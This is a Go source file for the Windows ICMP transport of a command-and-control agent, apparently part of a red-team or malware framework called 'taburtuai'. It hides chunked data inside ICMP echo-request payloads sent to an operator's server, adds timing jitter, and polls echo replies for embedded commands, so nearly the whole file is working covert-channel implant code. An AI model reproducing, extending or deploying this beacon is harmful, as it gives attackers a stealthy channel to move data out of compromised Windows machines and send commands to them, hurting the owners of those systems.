//go:build windows

// ICMP C2 transport — Windows implementation.
//
// ⚠ STATUS: AGENT-SIDE ONLY. The matching server listener is NOT YET
// IMPLEMENTED. See ROADMAP item 11.4. An agent built with
// `--transport icmp` will emit echo requests carrying framed C2 data, but
// will receive no command replies until cmd/listener/icmp_listener.go is
// written. Use HTTP/HTTPS/WS for end-to-end testing in the meantime.
//
// TODO(roadmap-11.4): implement cmd/listener/icmp_listener.go (raw socket
// listener that inspects incoming echo requests, demuxes by source IP,
// queues commands, and responds via crafted echo replies). When it lands,
// remove this notice and wire the build into cmd/server/main.go behind
// a `--icmp` flag.
//
// Uses IcmpSendEcho2 (iphlpapi.dll) which does NOT require a raw socket or
// elevated privileges when the destination is reachable, because Windows
// provides a privileged ICMP handle via IcmpCreateFile.
//
// Protocol:
//   Agent → Server  (ICMP echo request):
//     Payload: [magic(4)] [seq(2)] [total(2)] [chunk-index(1)] [data...]
//     magic = 0x54425543 ("TBUC" — taburtuai covert)
//
//   Server → Agent  (ICMP echo reply, carries command):
//     Same framing in the reply data field.
//     C2 server must run a raw-socket listener that inspects echo requests
//     and crafts echo replies with command payloads embedded.
//     See cmd/listener/icmp_listener.go (planned — not yet implemented).
//
// Requires: IcmpSendEcho2 available on Windows XP+ (no raw socket needed).
package transport

import (
	"encoding/binary"
	"fmt"
	"math/rand"
	"net"
	"sync/atomic"
	"syscall"
	"time"
	"unsafe"
)

var (
	iphlpapi        = syscall.NewLazyDLL("iphlpapi.dll")
	procIcmpCreate  = iphlpapi.NewProc("IcmpCreateFile")
	procIcmpClose   = iphlpapi.NewProc("IcmpCloseHandle")
	procIcmpSend    = iphlpapi.NewProc("IcmpSendEcho2")
)

const (
	icmpMagic     = uint32(0x54425543) // "TBUC"
	icmpHeaderLen = 9                  // magic(4)+seq(2)+total(2)+idx(1)
	icmpChunkSize = 200                // data bytes per echo request
	icmpTimeout   = 5000               // ms
)

// ICMP_ECHO_REPLY mirrors the Win32 structure (simplified, no options).
type icmpEchoReply struct {
	Address       uint32
	Status        uint32
	RoundTripTime uint32
	DataSize      uint16
	Reserved      uint16
	Data          unsafe.Pointer // Win32 PVOID — not GC-managed
	Options       [8]byte
}

// ICMPClient implements the C2 beacon over raw ICMP echo request/reply.
type ICMPClient struct {
	ServerIP  string
	SessionID string
	seq       atomic.Int64
	handle    uintptr
}

// NewICMPClient opens an ICMP handle and returns a ready client.
// Does not require administrator on modern Windows when targeting reachable IPs.
func NewICMPClient(serverIP, agentID string) (*ICMPClient, error) {
	h, _, err := procIcmpCreate.Call()
	if h == 0 {
		return nil, fmt.Errorf("IcmpCreateFile: %v", err)
	}
	sid := agentID
	if len(sid) > 8 {
		sid = sid[:8]
	}
	return &ICMPClient{
		ServerIP:  serverIP,
		SessionID: sid,
		handle:    h,
	}, nil
}

// SendData splits payload into ICMP-sized chunks and sends each as an echo request.
// The server reconstructs the stream from successive requests tagged with seq+idx.
func (c *ICMPClient) SendData(payload []byte) error {
	if len(payload) == 0 {
		return nil
	}
	seq := uint16(c.seq.Add(1) & 0xFFFF)
	chunks := splitICMPChunks(payload, icmpChunkSize)
	total := uint16(len(chunks))

	destIP := net.ParseIP(c.ServerIP).To4()
	if destIP == nil {
		return fmt.Errorf("invalid server IP: %s", c.ServerIP)
	}
	dest := binary.BigEndian.Uint32(destIP)

	for i, chunk := range chunks {
		pkt := buildICMPPayload(seq, total, uint8(i), chunk)
		if err := c.sendEcho(dest, pkt); err != nil {
			return fmt.Errorf("ICMP send chunk %d: %w", i, err)
		}
		time.Sleep(time.Duration(rand.Intn(200)+50) * time.Millisecond)
	}
	return nil
}

// PollCommand sends a zero-length echo and inspects the reply for a command payload.
// Returns nil, nil when no command is pending (reply data is empty / wrong magic).
func (c *ICMPClient) PollCommand() ([]byte, error) {
	destIP := net.ParseIP(c.ServerIP).To4()
	if destIP == nil {
		return nil, fmt.Errorf("invalid server IP: %s", c.ServerIP)
	}
	dest := binary.BigEndian.Uint32(destIP)

	// Poll packet: magic only, no data
	pkt := buildICMPPayload(0, 0, 0xFF, nil)
	reply, err := c.sendEchoRecv(dest, pkt)
	if err != nil {
		return nil, fmt.Errorf("ICMP poll: %w", err)
	}
	if len(reply) < icmpHeaderLen {
		return nil, nil
	}
	magic := binary.LittleEndian.Uint32(reply[:4])
	if magic != icmpMagic {
		return nil, nil
	}
	data := reply[icmpHeaderLen:]
	if len(data) == 0 {
		return nil, nil
	}
	return data, nil
}

// Close releases the ICMP handle.
func (c *ICMPClient) Close() {
	if c.handle != 0 {
		procIcmpClose.Call(c.handle)
		c.handle = 0
	}
}

// ── private helpers ───────────────────────────────────────────────────────────

func buildICMPPayload(seq, total uint16, idx uint8, data []byte) []byte {
	buf := make([]byte, icmpHeaderLen+len(data))
	binary.LittleEndian.PutUint32(buf[0:], icmpMagic)
	binary.LittleEndian.PutUint16(buf[4:], seq)
	binary.LittleEndian.PutUint16(buf[6:], total)
	buf[8] = idx
	copy(buf[icmpHeaderLen:], data)
	return buf
}

func (c *ICMPClient) sendEcho(destAddr uint32, payload []byte) error {
	_, err := c.sendEchoRecv(destAddr, payload)
	return err
}

func (c *ICMPClient) sendEchoRecv(destAddr uint32, payload []byte) ([]byte, error) {
	const replyBufSize = 4096
	replyBuf := make([]byte, replyBufSize)

	var dataPtr uintptr
	var dataLen uint32
	if len(payload) > 0 {
		dataPtr = uintptr(unsafe.Pointer(&payload[0]))
		dataLen = uint32(len(payload))
	}

	ret, _, err := procIcmpSend.Call(
		c.handle,
		0, // event (unused)
		0, // APC routine (unused)
		0, // APC context (unused)
		uintptr(destAddr),
		dataPtr,
		uintptr(dataLen),
		0, // request options (nil)
		uintptr(unsafe.Pointer(&replyBuf[0])),
		uintptr(replyBufSize),
		uintptr(icmpTimeout),
	)
	if ret == 0 {
		return nil, fmt.Errorf("IcmpSendEcho2: %v", err)
	}

	// Parse first ICMP_ECHO_REPLY
	if len(replyBuf) < int(unsafe.Sizeof(icmpEchoReply{})) {
		return nil, nil
	}
	reply := (*icmpEchoReply)(unsafe.Pointer(&replyBuf[0]))
	if reply.Status != 0 || reply.DataSize == 0 {
		return nil, nil
	}
	// Copy reply data into a Go slice
	data := make([]byte, reply.DataSize)
	src := unsafe.Slice((*byte)(reply.Data), reply.DataSize)
	copy(data, src)
	return data, nil
}

func splitICMPChunks(data []byte, size int) [][]byte {
	var chunks [][]byte
	for len(data) > size {
		chunks = append(chunks, data[:size])
		data = data[size:]
	}
	if len(data) > 0 {
		chunks = append(chunks, data)
	}
	return chunks
}
